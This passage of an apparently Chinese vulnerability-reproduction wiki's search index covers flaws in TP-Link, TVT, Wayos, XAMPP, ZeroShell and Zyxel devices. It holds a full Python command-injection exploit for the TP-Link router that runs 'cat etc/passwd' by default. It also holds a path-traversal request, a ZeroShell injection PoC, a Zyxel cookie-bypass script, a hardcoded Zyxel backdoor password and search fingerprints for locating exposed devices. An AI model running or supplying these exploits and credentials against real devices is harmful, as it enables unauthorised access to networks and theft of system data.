","date":"0001-01-01","objectID":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/:1:0","tags":null,"title":"","uri":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/"},{"categories":null,"content":"漏洞影响 TP-Link TL-WR841N ","date":"0001-01-01","objectID":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/:2:0","tags":null,"title":"","uri":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/"},{"categories":null,"content":"网络测绘 app=\"TP_LINK-TL-WR841N\" ","date":"0001-01-01","objectID":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/:3:0","tags":null,"title":"","uri":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/"},{"categories":null,"content":"漏洞复现 poc： # Author: Koh You Liang (Isopach) # Exploit Title: TP-Link TL-WR841N OS Command Injection Exploit # Date: 2020-12-13 # Vendor Homepage: https://www.tp-link.com/ # Software Link: https://www.tp-link.com/jp/support/download/tl-wr841n/v13/#Firmware # Version: TL-WR841N 0.9.1 4.0 # Tested on: Windows 10, macOS Mojave, Ubuntu 20.04.1 LTS # CVE: CVE-2020-35576 import requests import sys import time try: _ = sys.argv[2] payload = ' '.join(sys.argv[1:]) except IndexError: try: payload = sys.argv[1] except IndexError: print(\"[*] Command not specified, using the default `cat etc/passwd`\") payload = 'cat etc/passwd' # Default credentials is admin:admin - replace with your own cookies = { 'Authorization': 'Basic YWRtaW46YWRtaW4=' } headers = { 'Host': '192.168.0.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'text/plain', 'Content-Length': '197', 'Origin': 'http://192.168.0.1', 'Connection': 'close', 'Referer': 'http://192.168.0.1/mainFrame.htm', } data1 = \\ '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\r\\nmaxHopCount=20\\r\\ntimeout=50\\r\\nnumberOfTries=1\\r\\nhost=\"`{}`\"\\r\\ndataBlockSize=64\\r\\nX_TP_ConnName=ewan_ipoe_d\\r\\ndiagnosticsState=Requested\\r\\nX_TP_HopSeq=0\\r\\n'''.format(payload) response1 = requests.post('http://192.168.0.1/cgi?2', headers=headers, cookies=cookies, data=data1, verify=False) print('[+] Sending payload...') try: response1.text.splitlines()[0] except IndexError: sys.exit('[-] Cannot get response. Please check your cookie.') if response1.text.splitlines()[0] != '[error]0': sys.exit('[*] Router/Firmware is not vulnerable.') data2 = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\r\\n' response2 = requests.post('http://192.168.0.1/cgi?7', headers=headers, cookies=cookies, data=data2, verify=False) print('[+] Receiving response from router...') time.sleep(0.8) # Buffer time for traceroute to succeed data3 = '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\ndiagnosticsState\\r\\nX_TP_HopSeq\\r\\nX_TP_Result\\r\\n''' response3 = requests.post('http://192.168.0.1/cgi?1', headers=headers, cookies=cookies, data=data3, verify=False) if '=:' in response3.text.splitlines()[3]: print('[-] Command not supported.') else: print('[+] Exploit successful!') for line_number, line in enumerate(response3.text.splitlines()): try: if line_number == 3: print(line[12:]) if line_number \u003e 3 and line != '[error]0': print(line) if 'not known' in line: break except IndexError: break ","date":"0001-01-01","objectID":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/:4:0","tags":null,"title":"","uri":"/tp-link-tl-wr841n-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-35576/"},{"categories":null,"content":"TVT数码科技 NVMS-1000 路径遍历漏洞 ","date":"0001-01-01","objectID":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件 ","date":"0001-01-01","objectID":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 TVT NVMS-1000 ","date":"0001-01-01","objectID":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TVT-NVMS-1000\" ","date":"0001-01-01","objectID":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包读取文件 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close ","date":"0001-01-01","objectID":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/tvt%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-nvms-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Wayos AC集中管理系统默认弱口令 CNVD-2021-00876 ","date":"0001-01-01","objectID":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/:0:0","tags":null,"title":"","uri":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/"},{"categories":null,"content":"漏洞描述 深圳维盟科技股份有限公司是国内领先的网络设备及智能家居产品解决方案供应商，主营产品包括无线网关、交换机、国外VPN、双频吸顶ap等。 AC集中管理平台存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/:1:0","tags":null,"title":"","uri":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/"},{"categories":null,"content":"漏洞影响 AC集中管理系统 ","date":"0001-01-01","objectID":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/:2:0","tags":null,"title":"","uri":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/"},{"categories":null,"content":"网络测绘 title=\"AC集中管理系统\" ","date":"0001-01-01","objectID":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/:3:0","tags":null,"title":"","uri":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/"},{"categories":null,"content":"漏洞复现 默认弱口令为 admin:admin ","date":"0001-01-01","objectID":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/:4:0","tags":null,"title":"","uri":"/wayos-ac%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4-cnvd-2021-00876/"},{"categories":null,"content":"Wayos 防火墙 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Wayos 防火墙 后台存在命令执行漏洞，通过命令注入可以执行远程命令 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Wayos 防火墙 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"Get_Verify_Info(hex_md5(user_string).\" ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 登录后台后 ping 模块命令执行 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Wayos 防火墙 账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Wayos 防火墙存在账号密码泄露漏洞，攻击者通过前端可以查看到密码的md5的加密字符，解密后可以登陆后台 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Wayos 防火墙 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"Get_Verify_Info(hex_md5(user_string).\" ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 F12 查看账号密码 解密Md5即可登录后台 ","date":"0001-01-01","objectID":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/wayos-%E9%98%B2%E7%81%AB%E5%A2%99-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"XAMPP phpinfo.php 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 XAMPP存在信息泄露漏洞，/dashboard/phpinfo.php 访问权限控制不严格，攻击者可获取系统敏感信息。 ","date":"0001-01-01","objectID":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 XAMPP ","date":"0001-01-01","objectID":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Welcome to XAMPP\" ","date":"0001-01-01","objectID":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 访问页面 /dashboard/phpinfo.php ","date":"0001-01-01","objectID":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/xampp-phpinfo.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725 ","date":"0001-01-01","objectID":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/:0:0","tags":null,"title":"","uri":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/"},{"categories":null,"content":"漏洞描述 ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，x509type 参数过滤不严格，导致攻击者可执行任意命令 ","date":"0001-01-01","objectID":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/:1:0","tags":null,"title":"","uri":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/"},{"categories":null,"content":"漏洞影响 ZeroShell \u003c 3.9.0 ","date":"0001-01-01","objectID":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/:2:0","tags":null,"title":"","uri":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/"},{"categories":null,"content":"网络测绘 app=\"Zeroshell-防火墙\" ","date":"0001-01-01","objectID":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/:3:0","tags":null,"title":"","uri":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/"},{"categories":null,"content":"漏洞复现 登录页面如下 验证的POC为 /cgi-bin/kerbynet?Action=x509view\u0026Section=NoAuthREQ\u0026User=\u0026x509type=%27%0Aid%0A%27 ","date":"0001-01-01","objectID":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/:4:0","tags":null,"title":"","uri":"/zeroshell-3.9.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-12725/"},{"categories":null,"content":"Zyxel NBG2105 身份验证绕过 CVE-2021-3297 ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:0:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"漏洞描述 Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆 ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:1:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"漏洞影响 Zyxel NBG2105 ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:2:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"网络测绘 app=\"ZyXEL-NBG2105\" ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:3:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"漏洞复现 登录页面如下 其中前端文件 /js/util_gw.js 存在前端对 Cookie login参数的校验 可以看到检测到 Cookie中的 login=1 则跳转 home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } 请求如下则会以管理员身份跳转到 home.htm页面 http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:4:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"漏洞POC # python3 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def poc(url): exp = url + \"/login_ok.htm\" header = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cookie\":\"login=1\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=exp, headers=header, verify=False,timeout=10) #print(response.text) if response.status_code == 200 and \"GMT\" in response.text: print(exp + \" 存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！\") print(\"数据信息如下：\") print(response.text) else: print(exp + \" 不存在Zyxel NBG2105 身份验证绕过 CVE-2021-3297漏洞！！！\") except Exception as e: print(exp + \"请求失败！！\") def main(): url = str(input(\"请输入目标url：\")) poc(url) if __name__ == \"__main__\": main() ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:5:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"参考文章 https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass ","date":"0001-01-01","objectID":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/:6:0","tags":null,"title":"","uri":"/zyxel-nbg2105-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-3297/"},{"categories":null,"content":"Zyxel 硬编码后门账户漏洞 CVE-2020-29583 ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:0:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"漏洞描述 Zyxel固件中发现的后门被称为关键固件漏洞，CVE编号CVE-2020-29583，得分为7.8 CVSS。虽然CVSS评分看似不是很高，但却不可小觑。研究人员表示，这是一个极为严重的漏洞，所有者必须立即更新其系统。因为任何人都可以轻松利用这个漏洞，从DDoS僵尸网络运营商到勒索软件团体和政府资助的黑客。 通过滥用后门账户，网络罪犯可以访问易受攻击的设备并感染内部网络以发起其他攻击。攻击者可以使用管理特权登录设备，并轻易破坏网络设备。 ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:1:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"漏洞影响 Zyxel USG系列 Zyxel ATP系列 Zyxel NCX系列 Zyxel USG FIEX系列 Zyxel VPN系列 ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:2:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"网络测绘 title=\"USG40\" \"NXC2500\" 等 ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:3:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"漏洞复现 分析固件中有 FTP 的后门密码 使用漏洞扫描脚本 找到易受攻击的版本 进行攻击，登录为后门管理员账户 zyfwp:PrOw!aN_fXp 这里使用Goby设置字典扫描即可 ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:4:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"参考文章 scan_CVE-2020-29583 Zyxel USG Series 账户硬编码漏洞（CVE-2020-29583） ","date":"0001-01-01","objectID":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/:5:0","tags":null,"title":"","uri":"/zyxel-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E-cve-2020-29583/"},{"categories":null,"content":"三星 WLAN 